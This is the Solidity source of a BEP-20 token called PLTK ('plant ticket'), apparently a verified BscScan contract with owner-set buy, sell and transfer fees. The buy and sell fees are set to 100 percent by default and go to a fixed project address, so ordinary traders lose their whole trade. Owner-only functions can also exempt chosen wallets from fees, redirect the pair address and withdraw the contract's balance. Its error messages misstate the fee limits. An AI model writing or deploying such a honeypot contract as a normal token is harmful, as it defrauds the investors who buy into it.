/**
 *Submitted for verification at BscScan.com on 2022-12-03
*/

/**
 *Submitted for verification at BscScan.com on 2022-08-15
*/
// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.6;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable {
    address public _owner;
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function changeOwner(address newOwner) public onlyOwner {
        _owner = newOwner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IPancakePair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}
contract PLTK is IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => address) inviter; 
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal;
    uint256 public _tTotalFeeMax;
    uint256 private _rTotal;
    uint256 public _buyFee;
    uint256 public _sellFee;
    uint256 public _tFee;
    string private _name;
    string private _symbol;
    uint256 private _decimals;
    address private _destroyAddress = address(0x000000000000000000000000000000000000dEaD);
    address private _projectAddress = address(0x9f8309757CE388E7DFD2a490a3Ac5C98cAB22843);
    address public uniswapV2Pair;
    address[] whiteUserList;
    mapping(address => bool) public havePush;
    constructor(address tokenOwner) {
        _name = "plant ticket";
        _symbol = "PLTK";
        _decimals = 18;
        _tTotal = 100000000 * 10**_decimals;
        _rTotal = (MAX - (MAX % _tTotal));
        _buyFee = 100 ;
        _sellFee = 100 ;
        _tFee = 5 ;
        _rOwned[tokenOwner] = _rTotal;
        _isExcludedFromFee[tokenOwner] = true;
        _isExcludedFromFee[_destroyAddress] = true;
        _isExcludedFromFee[_projectAddress] = true;
        _owner = msg.sender;
        emit Transfer(address(0), tokenOwner, _tTotal);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }
    function sync() external {
        IPancakePair(uniswapV2Pair).sync();
    }
    function set_buyFee(uint256 buyFee) public onlyOwner {
        require(buyFee <= 100, "The entered amount cannot exceed 1000!" );
        require(buyFee >= 5, "The entered amount must not be less than 5!" );
         _buyFee = buyFee;
    } 
    function set_sellFee(uint256 sellFee) public onlyOwner {        
        require(sellFee <= 100, "The entered amount cannot exceed 1000!" );
        require(sellFee >= 5, " The entered amount must not be less than 5!" );
         _sellFee = sellFee;
    } 
    function set_tFee(uint256 tFee) public onlyOwner {        
        require(tFee <= 100, "The entered amount cannot exceed 1000!" );
        require(tFee >= 0, "The entered amount must not be less than 0!" );
         _tFee = tFee;
    } 
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
		if(uniswapV2Pair == address(0) && amount >= _tTotal.div(2)){
			uniswapV2Pair = recipient;
		}
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }
    function tokenFromReflection(uint256 rAmount)
        public
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
        if(!havePush[account]){
            whiteUserList.push(account);
            havePush[account] = true;
        }
        
    }
    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
        if(havePush[account]){
            havePush[account] = false;
        }
    }

    function getWhiteListLength() private view returns (uint256) {
        return whiteUserList.length;
    }

    receive() external payable {}
    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }
    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
    function claimTokens() public onlyOwner {
        payable(_owner).transfer(address(this).balance);
    }
    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }
	function getInviter(address account) public view returns (address) {
        return inviter[account];
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        bool isInviter = from != uniswapV2Pair && balanceOf(to) == 0 && inviter[to] == address(0); 
        bool takeFee = true;        

        if(from == uniswapV2Pair){
                if(!_isExcludedFromFee[to] &&  to != uniswapV2Pair && to != address(this)){
                    
                }else{
                    takeFee = false;
                }                
				_tokenTransferBuy(from, to, amount, takeFee);
	    }else if(to == uniswapV2Pair){
                if(!_isExcludedFromFee[from] && from != uniswapV2Pair && from != address(this)){ 
                   
                }else{
                    takeFee = false;
                }  
                _tokenTransferSell(from, to, amount, takeFee);
        }else{
            if(_isExcludedFromFee[from] || from == _owner || _isExcludedFromFee[to]){ 
                takeFee=false; 
            }
                _tokenTransfer(from, to, amount, takeFee);
        }
        if(isInviter) {
            inviter[to] = from;
        }
    }
    function _tokenTransferBuy(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);

        uint256 rate;
        if (takeFee) {
            uint256 Fee = _buyFee;           
            uint256 projectFee = tAmount.mul(Fee).div(100);
            _takeTransfer(sender, _projectAddress, projectFee, currentRate);
            rate = Fee;
        }

        uint256 recipientRate = 100 - rate;
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.mul(recipientRate).div(100)
        );
        emit Transfer(sender, recipient, tAmount.mul(recipientRate).div(100));
    }   
    function _tokenTransferSell(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);

        uint256 rate;
        if (takeFee) {
            uint256 Fee = _sellFee;    
            uint256 projectFee = tAmount.mul(Fee).div(100);
            _takeTransfer(sender, _projectAddress, projectFee, currentRate);
            rate = Fee;      
        }        
        uint256 recipientRate = 100 - rate;  
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.mul(recipientRate).div(100)
        );
        emit Transfer(sender, recipient, tAmount.div(100).mul(recipientRate));
    }
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        uint256 currentRate = _getRate();
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);

        uint256 rate;
        if (takeFee) {
            uint256 Fee = _tFee;
            uint256 projectFee = tAmount.mul(Fee).div(100);
            _takeTransfer(sender, _projectAddress, projectFee, currentRate);
            rate = Fee;
        }
        uint256 recipientRate = 100 - rate;
        _rOwned[recipient] = _rOwned[recipient].add(
            rAmount.div(100).mul(recipientRate)
        );
        emit Transfer(sender, recipient, tAmount.mul(recipientRate).div(100));
    }
    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount,
        uint256 currentRate
    ) private {
        uint256 rAmount = tAmount.mul(currentRate);
        _rOwned[to] = _rOwned[to].add(rAmount);
        emit Transfer(sender, to, tAmount);
    }
    function changeRouter(address router) public onlyOwner {
        uniswapV2Pair = router;
    }
}